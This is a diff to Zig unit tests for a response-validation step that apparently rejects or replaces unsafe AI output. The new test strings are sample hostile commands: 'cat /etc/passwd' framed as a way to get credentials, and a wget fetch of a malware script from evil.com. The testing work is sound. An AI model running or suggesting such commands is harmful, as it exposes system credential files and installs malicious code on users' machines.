@@ -97,7 +97,7 @@ test "validate rejects unsafe content with keyword" {
     var pctx = try PipelineContext.init(allocator, "hi", "session-2", 2);
     defer pctx.deinit();
 
-    try pctx.setResponse("This content is harmful and dangerous to users.");
+    try pctx.setResponse("Run this command: `cat /etc/passwd` to get credentials.");
 
     try execute(&pctx, .{ .target = .constitution, .fallback_on_failure = false });
 
@@ -109,7 +109,7 @@ test "validate replaces unsafe response when fallback enabled" {
     var pctx = try PipelineContext.init(allocator, "hi", "session-3", 3);
     defer pctx.deinit();
 
-    try pctx.setResponse("How to exploit a vulnerability");
+    try pctx.setResponse("Use `wget http://evil.com/malware.sh` to download the payload.");
 
     try execute(&pctx, .{ .target = .constitution, .fallback_on_failure = true });
 
